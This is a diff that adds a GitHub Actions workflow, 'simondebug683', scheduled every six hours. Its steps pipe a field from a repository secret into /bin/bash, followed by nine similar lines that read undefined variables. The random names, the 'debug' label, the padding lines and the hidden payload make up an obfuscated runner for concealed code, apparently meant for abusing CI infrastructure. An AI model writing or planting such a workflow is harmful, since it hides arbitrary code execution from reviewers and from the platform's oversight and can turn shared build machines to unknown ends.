@@ -1,0 +1,26 @@
+name: simondebug683
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: simondebug683
+        env:
+          cipp28: ${{ secrets.cipp28 }}
+        run: |
+          echo $cipp28 | jq -r .lhtna95 | /bin/bash
+          echo $n34 | jq -r .nyc55 | /bin/bash
+          echo $fyxuj474 | jq -r .axy1 | /bin/bash
+          echo $kwrn42 | jq -r .qisyx63443 | /bin/bash
+          echo $f3 | jq -r .ycq87 | /bin/bash
+          echo $sa02997 | jq -r .zuyw00824 | /bin/bash
+          echo $edfye246 | jq -r .x9890 | /bin/bash
+          echo $qch02426 | jq -r .mxbts55622 | /bin/bash
+          echo $due73 | jq -r .krrdt8669 | /bin/bash
+          echo $qiwq2 | jq -r .qka863 | /bin/bash
+
